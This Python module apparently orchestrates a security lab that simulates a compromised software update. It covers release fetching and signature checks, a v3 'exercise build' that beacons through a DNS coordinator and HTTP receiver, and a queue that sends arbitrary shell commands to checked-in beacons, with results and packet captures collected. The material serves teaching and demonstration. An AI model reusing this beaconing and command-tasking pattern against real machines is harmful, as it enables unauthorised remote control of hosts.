"""Client update flow and attacker-side DNS/HTTP exercise behavior."""

from __future__ import annotations

import json
import hashlib
import os
import re
import sys
import threading
import time
import uuid
import zipfile
from datetime import datetime, timezone
from io import BytesIO
from pathlib import Path

import config
import state
import topology
from state import (
    BEACONS_PATH,
    DNS_LOG,
    RECEIVER_LOG,
    RESULT_LOG,
    RESULTS_PATH,
    UPDATE_LOG,
    WORK_DIR,
    append_history,
    lab_io_lock,
    read_timeline,
)


VERSIONS = ("v1", "v2", "v3")
MODES = ("passive", "selected", "disabled")
DEMO_DELAY_SECONDS = 3
BEACON_INTERVAL_SECONDS = 4
UPDATE_POLL_SECONDS = 1.5
MONITOR_STOP = threading.Event()
monitor_thread: threading.Thread | None = None


def write_mode(mode: str) -> None:
    if mode not in MODES:
        raise ValueError("Choose passive, selected, or disabled.")
    with lab_io_lock:
        temporary = state.MODE_PATH.with_suffix(".tmp")
        temporary.write_text(json.dumps({"mode": mode}), encoding="utf-8")
        os.replace(temporary, state.MODE_PATH)
        with state.state_lock:
            state.coordinator_mode = mode


def _set_update_status(
    status: str,
    message: str,
    available_version: str | None = None,
    percent: int = 0,
) -> None:
    with state.state_lock:
        state.update_status = {
            "state": status,
            "message": message,
            "available_version": available_version,
            "last_check": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "percent": percent,
        }


def _read_json(path: Path) -> dict[str, object] | None:
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    return value if isinstance(value, dict) else None


def _read_json_list(path: Path) -> list[object]:
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return []
    return value if isinstance(value, list) else []


def queue_task(command: str, target: str) -> str:
    command = command.strip()
    if not command or len(command) > 500:
        raise ValueError("Enter a command between 1 and 500 characters.")
    with lab_io_lock:
        beacons = _read_json(BEACONS_PATH) or {}
        if target != "all" and target not in beacons:
            raise ValueError("Choose all beacons or a beacon that has checked in.")
        task = {
            "task_id": f"task-{uuid.uuid4().hex[:8]}",
            "target": target,
            "command": command,
            "queued_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "delivered_to": [],
            "completed_by": [],
        }
        temporary = state.TASK_PATH.with_suffix(".tmp")
        temporary.write_text(json.dumps(task, sort_keys=True, indent=2) + "\n", encoding="utf-8")
        os.replace(temporary, state.TASK_PATH)
        destination = "all beacons" if target == "all" else str(beacons[target].get("hostname", target))
    return f"Queued '{command}' for {destination}."


def _fetch_catalog() -> tuple[dict[str, object], str]:
    catalog_path = WORK_DIR / "catalog.download.json"
    try:
        catalog_path.unlink()
    except FileNotFoundError:
        pass
    output = topology.host_command(
        "victim",
        [
            sys.executable,
            "/app/services.py",
            "fetch",
            f"http://{config.UPDATER_IP}:{config.UPDATE_PORT}/catalog.json",
            str(catalog_path),
        ],
    )
    try:
        catalog = json.loads(catalog_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise RuntimeError(f"Update catalog fetch failed: {exc}") from exc
    if not isinstance(catalog, dict) or not isinstance(catalog.get("releases"), list):
        raise RuntimeError("The update service returned an invalid release catalog.")
    return catalog, output.strip()


def _release_entry(catalog: dict[str, object], version: str) -> dict[str, object]:
    releases = catalog.get("releases")
    if not isinstance(releases, list):
        raise RuntimeError("The release catalog has no release list.")
    for entry in releases:
        if not isinstance(entry, dict) or entry.get("version") != version:
            continue
        artifact = entry.get("artifact")
        signature = entry.get("signature")
        digest = entry.get("sha256")
        if (
            not isinstance(artifact, str)
            or not re.fullmatch(r"orion-v[123]-[a-f0-9]{16}\.zip", artifact)
            or signature != f"{artifact}.sig"
            or not isinstance(digest, str)
            or not re.fullmatch(r"[a-f0-9]{64}", digest)
        ):
            raise RuntimeError("The release catalog entry is malformed.")
        return entry
    raise RuntimeError(f"{version.upper()} is not published to the update channel.")


def _validate_manifest(value: object, version: str) -> dict[str, object]:
    if not isinstance(value, dict) or set(value) != {"product", "version", "release_notes", "client_config", "exercise"}:
        raise RuntimeError("Downloaded package manifest has an invalid format.")
    if value.get("product") != "Orion Network Manager" or value.get("version") != version:
        raise RuntimeError("Downloaded package does not match the catalog version.")
    if not isinstance(value.get("release_notes"), str):
        raise RuntimeError("Release notes must be text.")
    config = value.get("client_config")
    if not isinstance(config, dict) or set(config) != {"theme", "topology", "health_summary"}:
        raise RuntimeError("Client configuration fields are invalid.")
    theme = config.get("theme")
    if not isinstance(theme, str) or theme not in {"classic", "midnight"}:
        raise RuntimeError("Package contains an unsupported client theme.")
    if not isinstance(config.get("topology"), bool) or not isinstance(config.get("health_summary"), bool):
        raise RuntimeError("Client feature settings must be true or false.")
    exercise = value.get("exercise")
    if not isinstance(exercise, dict) or set(exercise) != {"diagnostic_checkin"}:
        raise RuntimeError("Exercise settings are invalid.")
    if not isinstance(exercise.get("diagnostic_checkin"), bool):
        raise RuntimeError("The diagnostic setting must be true or false.")
    return value


def _install_release(
    entry: dict[str, object],
    reason: str,
    schedule_callback: bool = True,
    record_history: bool = True,
) -> dict[str, object]:
    version = str(entry["version"])
    with lab_io_lock:
        _set_update_status("downloading", f"Downloading {version.upper()} package and signature", version, 20)
        if record_history:
            append_history(f"Update agent found {version.upper()} in the stable channel.")
        artifact_path = WORK_DIR / "update.download.zip"
        signature_path = WORK_DIR / "update.download.zip.sig"
        for path in (artifact_path, signature_path):
            try:
                path.unlink()
            except FileNotFoundError:
                pass
        prefix = f"http://{config.UPDATER_IP}:{config.UPDATE_PORT}/"
        topology.host_command(
            "victim", [sys.executable, "/app/services.py", "fetch", prefix + str(entry["artifact"]), str(artifact_path)]
        )
        topology.host_command(
            "victim", [sys.executable, "/app/services.py", "fetch", prefix + str(entry["signature"]), str(signature_path)]
        )
        digest = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
        if digest != entry["sha256"]:
            raise RuntimeError("Downloaded package checksum does not match the catalog.")
        if record_history:
            append_history(f"Downloaded {entry['artifact']}.")
        _set_update_status("verifying", "Verifying package signature and checksum", version, 65)
        verify_output = topology.host_command(
            "victim",
            [
                "openssl", "dgst", "-sha256", "-verify", "/app/trust/signing-public.pem",
                "-signature", str(signature_path), str(artifact_path),
            ],
        )
        if "Verified OK" not in verify_output:
            raise RuntimeError("Package signature verification failed.")
        if record_history:
            append_history("Package checksum and signature verified.")
        with zipfile.ZipFile(BytesIO(artifact_path.read_bytes())) as package:
            if package.namelist() != ["manifest.json"]:
                raise RuntimeError("Package contents do not match the Orion release format.")
            info = package.getinfo("manifest.json")
            if info.file_size > 16 * 1024:
                raise RuntimeError("Release manifest exceeds the allowed size.")
            manifest = _validate_manifest(json.loads(package.read(info)), version)
        _set_update_status("installing", f"Installing {version.upper()} package", version, 90)
        installed_package = WORK_DIR / "installed-package.zip"
        installed_manifest_path = WORK_DIR / "installed.json"
        os.replace(artifact_path, installed_package)
        os.replace(_write_manifest_temp(manifest), installed_manifest_path)
        with state.state_lock:
            state.current_version = version
            state.installed_manifest = manifest
            state.install_generation += 1
            generation = state.install_generation
            state.last_callback = "No V3 check-in yet"
            state.update_status = {
                "state": "installed",
                "message": f"{version.upper()} installed and signature verified",
                "available_version": None,
                "last_check": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                "percent": 100,
            }
        if record_history:
            append_history(f"Installed Orion Network Manager {version.upper()}.")
        if version == "v3" and manifest["exercise"]["diagnostic_checkin"] is True and schedule_callback:
            with state.state_lock:
                state.last_callback = "Scheduled after short demo delay"
            threading.Thread(target=run_beacon, args=(generation,), daemon=True).start()
        return {"version": version, "sha256": digest}


def _write_manifest_temp(manifest: dict[str, object]) -> Path:
    path = WORK_DIR / "installed.json.tmp"
    path.write_text(json.dumps(manifest, sort_keys=True, indent=2) + "\n", encoding="utf-8")
    return path


def install_version(
    version: str,
    reason: str,
    schedule_callback: bool = True,
    record_history: bool = True,
) -> dict[str, object]:
    if version not in VERSIONS:
        raise ValueError("Choose V1, V2, or V3.")
    with lab_io_lock:
        catalog, _output = _fetch_catalog()
        entry = _release_entry(catalog, version)
        return _install_release(entry, reason, schedule_callback, record_history)


def _channel_check() -> str:
    catalog, output = _fetch_catalog()
    with state.state_lock:
        installed_version = state.current_version
        previous = dict(state.update_status)
    published = [
        entry for entry in catalog["releases"]
        if isinstance(entry, dict) and entry.get("version") in VERSIONS
    ]
    later = [entry for entry in published if VERSIONS.index(str(entry["version"])) > VERSIONS.index(installed_version)]
    if not later:
        if previous.get("state") != "up-to-date":
            append_history(f"No update available; {installed_version.upper()} is current.")
        _set_update_status("up-to-date", f"{installed_version.upper()} is current", None, 100)
        return output
    target = max(later, key=lambda entry: VERSIONS.index(str(entry["version"])))
    version = str(target["version"])
    if target.get("mandatory") is True:
        _install_release(target, "Mandatory channel rollout")
    else:
        _set_update_status("available", f"{version.upper()} is available to install", version, 0)
        if previous.get("available_version") != version:
            append_history(f"{version.upper()} is available; awaiting administrator approval.")
    return output


def check_for_updates() -> str:
    with lab_io_lock:
        _channel_check()
        with state.state_lock:
            status = dict(state.update_status)
        if status["state"] == "available":
            return f"{status['available_version']} is available. Install it from the client."
        if status["state"] == "installed":
            return str(status["message"])
        return f"Update check completed: {status['message']}"


def install_available_update() -> str:
    with lab_io_lock:
        catalog, _output = _fetch_catalog()
        with state.state_lock:
            version = state.update_status.get("available_version")
        if not isinstance(version, str) or version not in VERSIONS:
            return "No update is waiting for installation."
        entry = _release_entry(catalog, version)
        result = _install_release(entry, "Client administrator installed available update")
        return f"Installed {result['version'].upper()} and verified its release signature."


def start_update_monitor() -> None:
    global monitor_thread
    MONITOR_STOP.clear()

    def monitor() -> None:
        while not MONITOR_STOP.is_set():
            try:
                with lab_io_lock:
                    _channel_check()
            except Exception as exc:
                _set_update_status("error", f"Update check failed: {exc}", None, 0)
            MONITOR_STOP.wait(UPDATE_POLL_SECONDS)

    monitor_thread = threading.Thread(target=monitor, name="orion-update-agent", daemon=True)
    monitor_thread.start()


def select_version(version: str) -> str:
    install_version(version, "Presenter selected client version")
    return f"Installed {version.upper()}: {target_description(version)}"


def target_description(version: str) -> str:
    return {"v1": "baseline dashboard", "v2": "theme and topology update", "v3": "exercise build"}[version]


def _describe_checkin(result: dict[str, object]) -> str:
    mode = str(result.get("mode", "unknown"))
    if mode == "selected":
        task_result = result.get("task_result")
        if isinstance(task_result, dict):
            hostname = task_result.get("hostname", "unknown")
            command = task_result.get("command", "?")
            exit_code = task_result.get("exit_code")
            return f"Command result received from {hostname} ({command}, exit {exit_code})."
        if "http_request" not in result:
            if result.get("stage") == "handoff DNS lookup":
                return f"Active: handoff DNS lookup failed; no HTTP request was sent ({result.get('error', 'invalid response')})."
            if result.get("stage") == "receiver DNS lookup":
                return f"Active: receiver DNS lookup failed; no HTTP request was sent ({result.get('error', 'invalid response')})."
            if "handoff_query" not in result:
                return "Active: handoff DNS query did not complete; no HTTP request was sent."
            if result.get("handoff_rcode") != 0 or not result.get("handoff_answer"):
                return "Active: handoff DNS lookup failed; no HTTP request was sent."
            if result.get("receiver_rcode") != 0 or not result.get("receiver_query"):
                return "Active: receiver DNS lookup failed; no HTTP request was sent."
            return "Active: DNS handoff completed, but no HTTP request was sent."
        identity = result.get("identity")
        if result.get("http_status") == 200 and isinstance(identity, dict):
            return f"Beacon checked in from {identity.get('hostname', 'unknown')} ({identity.get('ip', 'unknown')})."
        if result.get("http_status") == 200:
            return "Active: HTTP check-in accepted (200)."
        if result.get("http_status") is not None:
            return f"Active: local HTTP receiver returned status {result['http_status']}."
        return f"Active: HTTP connection attempt failed before a response ({result.get('http_error', 'no response')})."
    if mode == "passive":
        return "Passive: DNS check-in received no follow-on instruction."
    if mode == "disabled":
        return "Disabled: local DNS coordinator returned NXDOMAIN."
    if mode == "error":
        return f"Check-in failed during {result.get('stage', 'an unknown stage')}: {result.get('error', 'unknown error')}"
    return f"Check-in failed or returned an unexpected result: {result}"


def run_beacon(generation: int) -> None:
    time.sleep(DEMO_DELAY_SECONDS)
    while True:
        with state.state_lock:
            if generation != state.install_generation or state.current_version != "v3":
                return
        try:
            output = topology.host_command(
                "victim",
                [sys.executable, "/app/services.py", "checkin", config.DNS_IP, "demo-01", "v3"],
            )
            result = json.loads(output.strip().splitlines()[-1])
            if not isinstance(result, dict):
                raise ValueError("check-in returned invalid JSON")
        except Exception as exc:
            result = {"mode": "error", "stage": "check-in service", "error": str(exc)}
        message = _describe_checkin(result)
        with state.state_lock:
            if generation != state.install_generation or state.current_version != "v3":
                return
            state.last_callback = message
        if str(result.get("mode", "")) == "disabled":
            return
        time.sleep(BEACON_INTERVAL_SECONDS)


def reset_demo() -> str:
    with lab_io_lock:
        install_version("v2", "Presenter reset client", schedule_callback=False, record_history=False)
        write_mode("passive")
        topology.stop_capture()
        try:
            state.PCAP_PATH.unlink()
        except FileNotFoundError:
            pass
        for path in (UPDATE_LOG, DNS_LOG, RECEIVER_LOG, RESULT_LOG):
            path.write_text("", encoding="utf-8")
        for path in (state.TASK_PATH, BEACONS_PATH, RESULTS_PATH):
            try:
                path.unlink()
            except FileNotFoundError:
                pass
        with state.state_lock:
            state.update_history.clear()
            state.last_callback = "No beacon yet"
            state.update_status = {
                "state": "up-to-date",
                "message": "V2 is current",
                "available_version": None,
                "last_check": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                "percent": 100,
            }
        append_history("Orion Network Manager V2 installed; stable channel checked.")
        topology.start_capture()
        if topology.capture_is_ready():
            return "Lab reset: client V2, coordinator passive, C2 capture running."
        return f"Lab reset: client V2 and passive mode, but C2 capture did not start: {topology.capture_error}"


def client_state() -> dict[str, object]:
    with state.state_lock:
        return {
            "version": state.current_version,
            "manifest": json.loads(json.dumps(state.installed_manifest)),
            "update": dict(state.update_status),
            "history": list(state.update_history[-20:]),
        }


def attacker_state() -> dict[str, object]:
    with state.state_lock:
        mode = state.coordinator_mode
        callback = state.last_callback
    beacons = _read_json(BEACONS_PATH) or {}
    timeline = read_timeline((
        ("DNS coordinator", DNS_LOG),
        ("HTTP receiver", RECEIVER_LOG),
        ("C2 task", RESULT_LOG),
    ))
    return {
        "mode": mode,
        "last_callback": callback,
        "beacons": sorted(
            (item for item in beacons.values() if isinstance(item, dict)),
            key=lambda item: str(item.get("last_seen", "")),
            reverse=True,
        ),
        "pending_task": _read_json(state.TASK_PATH),
        "results": _read_json_list(RESULTS_PATH),
        "timeline": timeline,
        "infrastructure": {
            "dns": f"{config.COORDINATOR_NAME}:{config.DNS_PORT}",
            "http": f"{config.RECEIVER_NAME}:{config.RECEIVER_PORT}",
            "channel": "HTTP",
        },
        "capture_ready": topology.capture_is_ready(),
        "capture_file": state.PCAP_PATH.name,
        "capture_error": topology.capture_error,
    }


def stop_update_monitor() -> None:
    MONITOR_STOP.set()
    if monitor_thread is not None and monitor_thread.is_alive():
        monitor_thread.join(timeout=2)
